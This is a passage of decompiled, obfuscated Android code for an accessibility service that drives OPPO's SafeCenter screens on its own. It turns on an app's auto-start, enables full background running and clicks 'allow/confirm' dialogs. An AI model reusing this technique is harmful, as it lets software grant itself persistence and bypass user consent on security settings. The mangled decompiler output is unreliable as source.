                i4 = oppoStepsSimplified$e$1.f54537a4;
                int i40 = oppoStepsSimplified$e$1.f54536a3;
                str6 = oppoStepsSimplified$e$1.f54535a2;
                Iterator it12 = oppoStepsSimplified$e$1.f54534a1;
                r2 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                str = "]成功";
                str2 = "✅ 开启[";
                it4 = it12;
                i3 = i40;
                oppoStepsSimplified$e$1.f54533a0 = r2;
                oppoStepsSimplified$e$1.f54534a1 = it4;
                oppoStepsSimplified$e$1.f54535a2 = str6;
                oppoStepsSimplified$e$1.f54536a3 = i3;
                oppoStepsSimplified$e$1.f54537a4 = i4;
                oppoStepsSimplified$e$1.f54541a8 = 20;
                it3 = it4;
                i2 = i4;
                i3 = i3;
                if (r2.m212352f7(3, 1500L, oppoStepsSimplified$e$1) == coroutineSingletons) {
                }
                accessibilityNodeInfoM212335d8 = r2.m212335d8();
                if (accessibilityNodeInfoM212335d8 != null) {
                }
                string = "";
                if (!AbstractC0779a1.m213652a5(string, "safecenter", true)) {
                }
                m212303e0("[SafeCenter] ✅ 成功进入SafeCenter自启动管理页，查找[" + r2.m212334d7() + "]...");
                M212320b8 = r2.m212320b8(r2.m212334d7());
                if (M212320b8 == 0) {
                }
                c0368a5 = r2;
                i18 = i2;
                i = M212320b8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a5;
                oppoStepsSimplified$e$1.f54534a1 = null;
                oppoStepsSimplified$e$1.f54535a2 = null;
                oppoStepsSimplified$e$1.f54536a3 = i == true ? 1 : 0;
                oppoStepsSimplified$e$1.f54537a4 = i18;
                oppoStepsSimplified$e$1.f54541a8 = 21;
                objM212343e7 = c0368a5.m212343e7(oppoStepsSimplified$e$1);
                c0368a52 = c0368a5;
                i6 = i;
                if (objM212343e7 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 20:
                int i41 = oppoStepsSimplified$e$1.f54537a4;
                int i42 = oppoStepsSimplified$e$1.f54536a3;
                str6 = oppoStepsSimplified$e$1.f54535a2;
                c1351vv2 = c1351vv4;
                Iterator it13 = oppoStepsSimplified$e$1.f54534a1;
                r2 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                str = "]成功";
                str2 = "✅ 开启[";
                it3 = it13;
                i2 = i41;
                i3 = i42;
                accessibilityNodeInfoM212335d8 = r2.m212335d8();
                if (accessibilityNodeInfoM212335d8 != null) {
                }
                string = "";
                if (!AbstractC0779a1.m213652a5(string, "safecenter", true)) {
                }
                m212303e0("[SafeCenter] ✅ 成功进入SafeCenter自启动管理页，查找[" + r2.m212334d7() + "]...");
                M212320b8 = r2.m212320b8(r2.m212334d7());
                if (M212320b8 == 0) {
                }
                c0368a5 = r2;
                i18 = i2;
                i = M212320b8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a5;
                oppoStepsSimplified$e$1.f54534a1 = null;
                oppoStepsSimplified$e$1.f54535a2 = null;
                oppoStepsSimplified$e$1.f54536a3 = i == true ? 1 : 0;
                oppoStepsSimplified$e$1.f54537a4 = i18;
                oppoStepsSimplified$e$1.f54541a8 = 21;
                objM212343e7 = c0368a5.m212343e7(oppoStepsSimplified$e$1);
                c0368a52 = c0368a5;
                i6 = i;
                if (objM212343e7 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 21:
                i18 = oppoStepsSimplified$e$1.f54537a4;
                int i43 = oppoStepsSimplified$e$1.f54536a3;
                C0368a5 c0368a512 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                c1351vv2 = c1351vv4;
                str = "]成功";
                str2 = "✅ 开启[";
                c0368a52 = c0368a512;
                i6 = i43;
                it5 = AbstractC0716jf.m213306g5("耗电管理", "耗电保护", "电量消耗", "耗电详情", "电池").iterator();
                while (true) {
                    if (!it5.hasNext()) {
                    }
                }
                oppoStepsSimplified$e$1.f54533a0 = c0368a52;
                oppoStepsSimplified$e$1.f54536a3 = i6;
                oppoStepsSimplified$e$1.f54537a4 = i18;
                oppoStepsSimplified$e$1.f54541a8 = 22;
                if (c0368a52.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 22:
                i18 = oppoStepsSimplified$e$1.f54537a4;
                i7 = oppoStepsSimplified$e$1.f54536a3;
                c0368a53 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                c1351vv2 = c1351vv4;
                str = "]成功";
                str2 = "✅ 开启[";
                i9 = i18;
                i8 = i7;
                c0368a54 = c0368a53;
                oppoStepsSimplified$e$1.f54533a0 = c0368a54;
                oppoStepsSimplified$e$1.f54536a3 = i8;
                oppoStepsSimplified$e$1.f54537a4 = i9;
                oppoStepsSimplified$e$1.f54541a8 = 23;
                if (c0368a54.m212354f9(1000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 23:
                i10 = oppoStepsSimplified$e$1.f54537a4;
                int i44 = oppoStepsSimplified$e$1.f54536a3;
                C0368a5 c0368a513 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                c1351vv2 = c1351vv4;
                str = "]成功";
                r6 = i44;
                c0368a55 = c0368a513;
                str2 = "✅ 开启[";
                it6 = AbstractC0716jf.m213306g5("允许完全后台行为", "允许应用后台行为", "允许后台运行", "完全后台行为", "后台运行", "允许后台活动", "完全允许后台行为").iterator();
                while (true) {
                    if (!it6.hasNext()) {
                    }
                }
                oppoStepsSimplified$e$1.f54533a0 = c0368a55;
                oppoStepsSimplified$e$1.f54536a3 = r6;
                oppoStepsSimplified$e$1.f54537a4 = i10;
                oppoStepsSimplified$e$1.f54541a8 = 24;
                if (c0368a55.m212354f9(1000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 24:
                i10 = oppoStepsSimplified$e$1.f54537a4;
                r6 = oppoStepsSimplified$e$1.f54536a3;
                c0368a55 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                c1351vv2 = c1351vv4;
                c0368a55.m212313a8("允许#确定");
                oppoStepsSimplified$e$1.f54533a0 = c0368a55;
                oppoStepsSimplified$e$1.f54536a3 = r6;
                oppoStepsSimplified$e$1.f54537a4 = i10;
                oppoStepsSimplified$e$1.f54541a8 = 25;
                if (c0368a55.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 25:
                i10 = oppoStepsSimplified$e$1.f54537a4;
                r6 = oppoStepsSimplified$e$1.f54536a3;
                c0368a55 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                c1351vv2 = c1351vv4;
                oppoStepsSimplified$e$12 = oppoStepsSimplified$e$1;
                c0368a56 = c0368a55;
                oppoStepsSimplified$e$12.f54533a0 = c0368a56;
                oppoStepsSimplified$e$12.f54536a3 = r6;
                oppoStepsSimplified$e$12.f54537a4 = i10;
                oppoStepsSimplified$e$12.f54541a8 = 26;
                if (c0368a56.m212345e9(oppoStepsSimplified$e$12) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 26:
                i11 = oppoStepsSimplified$e$1.f54537a4;
                ?? r5 = oppoStepsSimplified$e$1.f54536a3;
                c0368a56 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                c1351vv2 = c1351vv4;
                z = r5;
                i12 = i11;
                z2 = z;
                if (z2) {
                }
                if (i12 == 0) {
                }
                if (z2) {
                }
                c0368a56.getClass();
                m212303e0("✅ e()自启动完成");
                return c1351vv2;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* renamed from: b7 */
    public final boolean m212319b7(String str) {
        String string;
        String string2;
        String string3;
        m212303e0("[开关-开启] ========== 查找开关[" + str + "] ==========");
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        if (accessibilityNodeInfoM212335d8 == null) {
            m212303e0("[开关-开启] ❌ 获取root失败");
            return false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText(str);
        m212303e0("[开关-开启] 找到" + (listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0) + "个包含[" + str + "]的节点");
        if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
            AbstractC0003a2.m46c7("[开关-开启] ❌ 未找到开关[", str, "]");
            return false;
        }
        int i = 0;
        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
            int i2 = i + 1;
            if (accessibilityNodeInfo.isVisibleToUser()) {
                CharSequence text = accessibilityNodeInfo.getText();
                if (text == null || (string3 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string3).toString()) == null) {
                    string = "";
                }
                m212303e0("[开关-开启]   节点" + i + ": text='" + string + "'");
                if (string.equals(str) || AbstractC0779a1.m213652a5(string, str, false)) {
                    m212303e0("[开关-开启]   节点" + i + ": ✓ " + (string.equals(str) ? "精确" : "包含") + "匹配'" + str + "'");
                    AccessibilityNodeInfo parent = accessibilityNodeInfo;
                    for (int i3 = 0; parent != null && i3 < 8; i3++) {
                        m212303e0("[开关-开启]   节点" + i + ": 在层级" + i3 + " 查找开关组件...");
                        AccessibilityNodeInfo accessibilityNodeInfoM212301d5 = m212301d5(parent);
                        if (accessibilityNodeInfoM212301d5 != null) {
                            CharSequence className = accessibilityNodeInfoM212301d5.getClassName();
                            String strM213684d7 = (className == null || (string2 = className.toString()) == null) ? "unknown" : AbstractC0779a1.m213684d7(string2, ".");
                            boolean zIsChecked = accessibilityNodeInfoM212301d5.isChecked();
                            m212303e0("[开关-开启]   找到开关(层级" + i3 + "): class=" + strM213684d7 + ", isChecked=" + zIsChecked);
                            if (zIsChecked) {
                                AbstractC0003a2.m46c7("[开关-开启] ✅ [", str, "]已开启，无需操作");
                                return true;
                            }
                            m212303e0("[开关-开启]   尝试开启开关...");
                            m212303e0("[开关-开启]   策略1: 直接点击开关...");
                            boolean zPerformAction = accessibilityNodeInfoM212301d5.performAction(16);
                            m212303e0("[开关-开启]   策略1: 结果=" + zPerformAction);
                            if (zPerformAction) {
                                m212303e0("[开关-开启] ✅ 策略1成功: 直接点击开关!");
                                return true;
                            }
                            m212303e0("[开关-开启]   策略2: 点击开关父节点...");
                            AccessibilityNodeInfo parent2 = accessibilityNodeInfoM212301d5.getParent();
                            if (parent2 != null && parent2.isClickable()) {
                                boolean zPerformAction2 = parent2.performAction(16);
                                m212303e0("[开关-开启]   策略2: 结果=" + zPerformAction2);
                                if (zPerformAction2) {
                                    m212303e0("[开关-开启] ✅ 策略2成功: 开关父节点点击!");
                                    return true;
                                }
                            }
                            m212303e0("[开关-开启]   策略3: 点击整行...");
                            AccessibilityNodeInfo parent3 = accessibilityNodeInfo.getParent();
                            for (int i4 = 0; parent3 != null && i4 < 5; i4++) {
                                if (parent3.isClickable()) {
                                    boolean zPerformAction3 = parent3.performAction(16);
                                    m212303e0("[开关-开启]   策略3(level=" + i4 + "): 结果=" + zPerformAction3);
                                    if (zPerformAction3) {
                                        m212303e0("[开关-开启] ✅ 策略3成功: 整行点击(level=" + i4 + ")!");
                                        return true;
                                    }
                                }
                                parent3 = parent3.getParent();
                            }
                            m212303e0("[开关-开启]   策略4: 手势点击...");
                            Rect rect = new Rect();
                            accessibilityNodeInfoM212301d5.getBoundsInScreen(rect);
                            if (rect.width() > 0 && rect.height() > 0) {
                                float fCenterX = rect.centerX();
                                float fCenterY = rect.centerY();
                                m212303e0("[开关-开启]   手势点击坐标: (" + fCenterX + ", " + fCenterY + ")");
                                boolean zM212309a4 = m212309a4(fCenterX, fCenterY);
                                StringBuilder sb = new StringBuilder("[开关-开启]   策略4: 结果=");
                                sb.append(zM212309a4);
                                m212303e0(sb.toString());
                                if (zM212309a4) {
                                    m212303e0("[开关-开启] ✅ 策略4成功: 手势点击!");
                                    return true;
                                }
                            }
                            m212303e0("[开关-开启] ⚠️ 所有策略都尝试过了，返回true让流程继续");
                            return true;
                        }
                        parent = parent.getParent();
                    }
                    m212303e0("[开关-开启]   节点" + i + ": 向上8层都未找到开关组件");
                } else {
                    m212303e0("[开关-开启]   节点" + i + ": 跳过不匹配 '" + string + "'");
                }
            } else {
                m212303e0("[开关-开启]   节点" + i + ": 不可见，跳过");
            }
            i = i2;
        }
        AbstractC0003a2.m46c7("[开关-开启] ❌ 所有节点都未找到开关，未能开启[", str, "]");
        return false;
    }

    /* renamed from: b8 */
    public final boolean m212320b8(String str) {
        String string;
        String string2;
        String string3;
        m212303e0("[自启动开关] ========== 查找应用[" + str + "]的开关 ==========");
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        if (accessibilityNodeInfoM212335d8 == null) {
            m212303e0("[自启动开关] ❌ 获取root失败");
            return false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText(str);
        m212303e0("[自启动开关] 找到" + (listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0) + "个包含[" + str + "]的节点");
        if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
            AbstractC0003a2.m46c7("[自启动开关] ❌ 未找到应用[", str, "]");
            return false;
        }
        int i = 0;
        for (AccessibilityNodeInfo parent : listFindAccessibilityNodeInfosByText) {
            int i2 = i + 1;
            if (parent.isVisibleToUser()) {
                CharSequence text = parent.getText();
                if (text == null || (string3 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string3).toString()) == null) {
                    string = "";
                }
                m212303e0("[自启动开关]   节点" + i + ": text='" + string + "'");
                if (string.equals(str) || AbstractC0779a1.m213652a5(string, str, false)) {
                    m212303e0("[自启动开关]   节点" + i + ": ✓ 匹配[" + str + "]，查找同一行的开关...");
                    for (int i3 = 0; parent != null && i3 < 8; i3++) {
                        m212303e0("[自启动开关]   在层级" + i3 + " 查找开关组件...");
                        AccessibilityNodeInfo accessibilityNodeInfoM212301d5 = m212301d5(parent);
                        if (accessibilityNodeInfoM212301d5 != null) {
                            CharSequence className = accessibilityNodeInfoM212301d5.getClassName();
                            String strM213684d7 = (className == null || (string2 = className.toString()) == null) ? "unknown" : AbstractC0779a1.m213684d7(string2, ".");
                            boolean zIsChecked = accessibilityNodeInfoM212301d5.isChecked();
                            m212303e0("[自启动开关]   找到开关(层级" + i3 + "): class=" + strM213684d7 + ", isChecked=" + zIsChecked);
                            if (zIsChecked) {
                                AbstractC0003a2.m46c7("[自启动开关] ✅ 应用[", str, "]的开关已开启，无需操作");
                                return true;
                            }
                            m212303e0("[自启动开关]   尝试开启开关...");
                            m212303e0("[自启动开关]   策略1: 直接点击开关...");
                            if (accessibilityNodeInfoM212301d5.performAction(16)) {
                                m212303e0("[自启动开关] ✅ 策略1成功: 直接点击开关!");
                                return true;
                            }
                            m212303e0("[自启动开关]   策略2: 点击开关父节点...");
                            AccessibilityNodeInfo parent2 = accessibilityNodeInfoM212301d5.getParent();
                            if (parent2 != null && parent2.isClickable() && parent2.performAction(16)) {
                                m212303e0("[自启动开关] ✅ 策略2成功: 开关父节点点击!");
                                return true;
                            }
                            m212303e0("[自启动开关]   策略3: 点击整行...");
                            for (AccessibilityNodeInfo parent3 = parent; parent3 != null; parent3 = parent3.getParent()) {
                                if (parent3.isClickable() && parent3.performAction(16)) {
                                    m212303e0("[自启动开关] ✅ 策略3成功: 点击整行!");
                                    return true;
                                }
                            }
                            m212303e0("[自启动开关]   策略4: 手势点击开关位置...");
                            Rect rect = new Rect();
                            accessibilityNodeInfoM212301d5.getBoundsInScreen(rect);
                            if (rect.width() > 0 && rect.height() > 0) {
                                float fCenterX = rect.centerX();
                                float fCenterY = rect.centerY();
                                m212303e0("[自启动开关]   手势点击坐标: (" + fCenterX + ", " + fCenterY + ")");
                                if (m212309a4(fCenterX, fCenterY)) {
                                    m212303e0("[自启动开关] ✅ 策略4成功: 手势点击开关!");
                                    return true;
                                }
                            }
                        }
                        parent = parent.getParent();
                    }
                } else {
                    m212303e0("[自启动开关]   节点" + i + ": 跳过非匹配节点");
                }
            } else {
                m212303e0("[自启动开关]   节点" + i + ": 不可见，跳过");
            }
            i = i2;
        }
        AbstractC0003a2.m46c7("[自启动开关] ❌ 未能开启应用[", str, "]的开关");
        return false;
    }

    /* JADX WARN: Can't wrap try/catch for region: R(7:(4:(5:483|413|(1:415)|416|(1:418)(1:421))|465|433|434)|471|429|430|461|431|432) */
    /* JADX WARN: Code restructure failed: missing block: B:154:0x04c9, code lost:
    
        if (r12 == r3) goto L458;
     */
    /* JADX WARN: Code restructure failed: missing block: B:197:0x05a9, code lost:
    
        if (p000.b81.m210571b1(r13, r2) != r3) goto L199;
     */
    /* JADX WARN: Code restructure failed: missing block: B:287:0x0794, code lost:
    
        if (r13 == r3) goto L458;
     */
    /* JADX WARN: Code restructure failed: missing block: B:437:0x0aae, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:438:0x0aaf, code lost:
    
        r13 = "秒)";
     */
    /* JADX WARN: Code restructure failed: missing block: B:457:0x0b3f, code lost:
    
        if (r8.m212347f2(r2) != r3) goto L459;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Not initialized variable reg: 27, insn: 0x019a: MOVE (r4 I:??[long, double]) = (r27 I:??[long, double]), block:B:60:0x0194 */
    /* JADX WARN: Not initialized variable reg: 28, insn: 0x029a: MOVE (r4 I:??[long, double]) = (r28 I:??[long, double]), block:B:87:0x0294 */
    /* JADX WARN: Not initialized variable reg: 29, insn: 0x031c: MOVE (r4 I:??[long, double]) = (r29 I:??[long, double]), block:B:103:0x0316 */
    /* JADX WARN: Path cross not found for [B:317:0x0802, B:467:0x08ef], limit reached: 488 */
    /* JADX WARN: Path cross not found for [B:467:0x08ef, B:317:0x0802], limit reached: 488 */
    /* JADX WARN: Removed duplicated region for block: B:131:0x043d  */
    /* JADX WARN: Removed duplicated region for block: B:135:0x0444  */
    /* JADX WARN: Removed duplicated region for block: B:151:0x04b6  */
    /* JADX WARN: Removed duplicated region for block: B:153:0x04bc A[Catch: Exception -> 0x0459, PHI: r1 r2 r7 r10 r11 r20 r21 r27 r28 r29 r30
      0x04bc: PHI (r1v12 java.lang.String) = (r1v9 java.lang.String), (r1v13 java.lang.String), (r1v18 java.lang.String) binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r2v8 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1) = 
      (r2v2 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v9 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v10 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
     binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r7v29 long) = (r7v27 long), (r7v30 long), (r7v31 long) binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r10v20 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r10v17 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r10v21 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r10v22 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r11v6 int) = (r11v3 int), (r11v7 int), (r11v8 int) binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r20v11 java.lang.Object) = (r20v9 java.lang.Object), (r20v12 java.lang.Object), (r20v13 java.lang.Object) binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r21v9 java.lang.String) = (r21v7 java.lang.String), (r21v10 java.lang.String), (r21v11 java.lang.String) binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r27v9 java.lang.String) = (r27v7 java.lang.String), (r27v10 java.lang.String), (r27v11 java.lang.String) binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r28v13 java.lang.String) = (r28v11 java.lang.String), (r28v14 java.lang.String), (r28v15 java.lang.String) binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r29v11 java.lang.String) = (r29v9 java.lang.String), (r29v12 java.lang.String), (r29v13 java.lang.String) binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE]
      0x04bc: PHI (r30v7 java.lang.String) = (r30v5 java.lang.String), (r30v8 java.lang.String), (r30v11 java.lang.String) binds: [B:106:0x0331, B:150:0x04b4, B:152:0x04b8] A[DONT_GENERATE, DONT_INLINE], TRY_LEAVE, TryCatch #10 {Exception -> 0x0459, blocks: (B:200:0x05b3, B:136:0x0446, B:141:0x0462, B:143:0x047f, B:146:0x048f, B:149:0x04a5, B:153:0x04bc), top: B:481:0x0446 }] */
    /* JADX WARN: Removed duplicated region for block: B:180:0x0537  */
    /* JADX WARN: Removed duplicated region for block: B:184:0x053f  */
    /* JADX WARN: Removed duplicated region for block: B:203:0x05c5  */
    /* JADX WARN: Removed duplicated region for block: B:206:0x05d4  */
    /* JADX WARN: Removed duplicated region for block: B:207:0x05d7  */
    /* JADX WARN: Removed duplicated region for block: B:217:0x05fe A[Catch: Exception -> 0x0604, TRY_LEAVE, TryCatch #29 {Exception -> 0x0604, blocks: (B:210:0x05e0, B:212:0x05f4, B:217:0x05fe), top: B:506:0x05e0 }] */
    /* JADX WARN: Removed duplicated region for block: B:228:0x0635  */
    /* JADX WARN: Removed duplicated region for block: B:232:0x063c  */
    /* JADX WARN: Removed duplicated region for block: B:245:0x06ab  */
    /* JADX WARN: Removed duplicated region for block: B:246:0x06ad  */
    /* JADX WARN: Removed duplicated region for block: B:250:0x06c1  */
    /* JADX WARN: Removed duplicated region for block: B:253:0x06cb  */
    /* JADX WARN: Removed duplicated region for block: B:254:0x06ce  */
    /* JADX WARN: Removed duplicated region for block: B:257:0x06e9 A[Catch: Exception -> 0x0554, TryCatch #22 {Exception -> 0x0554, blocks: (B:272:0x0719, B:274:0x072e, B:276:0x074d, B:278:0x0759, B:281:0x076e, B:286:0x0786, B:251:0x06c3, B:255:0x06d0, B:257:0x06e9, B:262:0x06f5, B:233:0x063e, B:235:0x0653, B:237:0x0672, B:239:0x0683, B:243:0x0699, B:248:0x06b0, B:185:0x0541, B:189:0x055a, B:191:0x0579, B:193:0x0585, B:196:0x0599), top: B:500:0x0541 }] */
    /* JADX WARN: Removed duplicated region for block: B:262:0x06f5 A[Catch: Exception -> 0x0554, TRY_LEAVE, TryCatch #22 {Exception -> 0x0554, blocks: (B:272:0x0719, B:274:0x072e, B:276:0x074d, B:278:0x0759, B:281:0x076e, B:286:0x0786, B:251:0x06c3, B:255:0x06d0, B:257:0x06e9, B:262:0x06f5, B:233:0x063e, B:235:0x0653, B:237:0x0672, B:239:0x0683, B:243:0x0699, B:248:0x06b0, B:185:0x0541, B:189:0x055a, B:191:0x0579, B:193:0x0585, B:196:0x0599), top: B:500:0x0541 }] */
    /* JADX WARN: Removed duplicated region for block: B:264:0x06fe A[Catch: Exception -> 0x0ac1, PHI: r1 r2 r8 r10 r20 r21 r27 r28 r30
      0x06fe: PHI (r1v41 java.lang.String) = (r1v45 java.lang.String), (r1v45 java.lang.String), (r1v46 java.lang.String), (r1v46 java.lang.String) binds: [B:231:0x063a, B:237:0x0672, B:256:0x06e7, B:259:0x06f1] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r2v38 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1) = 
      (r2v42 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v42 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v43 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v43 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
     binds: [B:231:0x063a, B:237:0x0672, B:256:0x06e7, B:259:0x06f1] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r8v28 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r8v32 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r8v32 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r8v33 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r8v33 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:231:0x063a, B:237:0x0672, B:256:0x06e7, B:259:0x06f1] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r10v54 long) = (r10v58 long), (r10v58 long), (r10v59 long), (r10v59 long) binds: [B:231:0x063a, B:237:0x0672, B:256:0x06e7, B:259:0x06f1] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r20v33 java.lang.Object) = (r20v37 java.lang.Object), (r20v37 java.lang.Object), (r20v38 java.lang.Object), (r20v38 java.lang.Object) binds: [B:231:0x063a, B:237:0x0672, B:256:0x06e7, B:259:0x06f1] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r21v31 java.lang.String) = (r21v35 java.lang.String), (r21v35 java.lang.String), (r21v36 java.lang.String), (r21v36 java.lang.String) binds: [B:231:0x063a, B:237:0x0672, B:256:0x06e7, B:259:0x06f1] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r27v32 java.lang.String) = (r27v36 java.lang.String), (r27v36 java.lang.String), (r27v37 java.lang.String), (r27v37 java.lang.String) binds: [B:231:0x063a, B:237:0x0672, B:256:0x06e7, B:259:0x06f1] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r28v37 java.lang.String) = (r28v41 java.lang.String), (r28v41 java.lang.String), (r28v42 java.lang.String), (r28v42 java.lang.String) binds: [B:231:0x063a, B:237:0x0672, B:256:0x06e7, B:259:0x06f1] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r30v30 java.lang.String) = (r30v34 java.lang.String), (r30v34 java.lang.String), (r30v35 java.lang.String), (r30v35 java.lang.String) binds: [B:231:0x063a, B:237:0x0672, B:256:0x06e7, B:259:0x06f1] A[DONT_GENERATE, DONT_INLINE], TRY_ENTER, TRY_LEAVE, TryCatch #30 {Exception -> 0x0ac1, blocks: (B:310:0x07e8, B:264:0x06fe, B:225:0x0623), top: B:508:0x0623 }] */
    /* JADX WARN: Removed duplicated region for block: B:267:0x0710  */
    /* JADX WARN: Removed duplicated region for block: B:271:0x0717  */
    /* JADX WARN: Removed duplicated region for block: B:283:0x0780  */
    /* JADX WARN: Removed duplicated region for block: B:284:0x0782  */
    /* JADX WARN: Removed duplicated region for block: B:310:0x07e8 A[Catch: Exception -> 0x0ac1, PHI: r1 r2 r8 r10 r20 r27 r28 r30
      0x07e8: PHI (r1v55 java.lang.String) = (r1v59 java.lang.String), (r1v59 java.lang.String), (r1v60 java.lang.String) binds: [B:270:0x0715, B:276:0x074d, B:307:0x07e0] A[DONT_GENERATE, DONT_INLINE]
      0x07e8: PHI (r2v48 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1) = 
      (r2v54 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v54 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
      (r2v59 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$execute$1)
     binds: [B:270:0x0715, B:276:0x074d, B:307:0x07e0] A[DONT_GENERATE, DONT_INLINE]
      0x07e8: PHI (r8v41 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r8v106 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r8v107 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r8v108 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:270:0x0715, B:276:0x074d, B:307:0x07e0] A[DONT_GENERATE, DONT_INLINE]
      0x07e8: PHI (r10v68 long) = (r10v74 long), (r10v74 long), (r10v75 long) binds: [B:270:0x0715, B:276:0x074d, B:307:0x07e0] A[DONT_GENERATE, DONT_INLINE]
      0x07e8: PHI (r20v46 java.lang.Object) = (r20v52 java.lang.Object), (r20v52 java.lang.Object), (r20v53 java.lang.Object) binds: [B:270:0x0715, B:276:0x074d, B:307:0x07e0] A[DONT_GENERATE, DONT_INLINE]
      0x07e8: PHI (r27v47 java.lang.String) = (r27v51 java.lang.String), (r27v51 java.lang.String), (r27v52 java.lang.String) binds: [B:270:0x0715, B:276:0x074d, B:307:0x07e0] A[DONT_GENERATE, DONT_INLINE]
      0x07e8: PHI (r28v48 java.lang.String) = (r28v52 java.lang.String), (r28v52 java.lang.String), (r28v53 java.lang.String) binds: [B:270:0x0715, B:276:0x074d, B:307:0x07e0] A[DONT_GENERATE, DONT_INLINE]
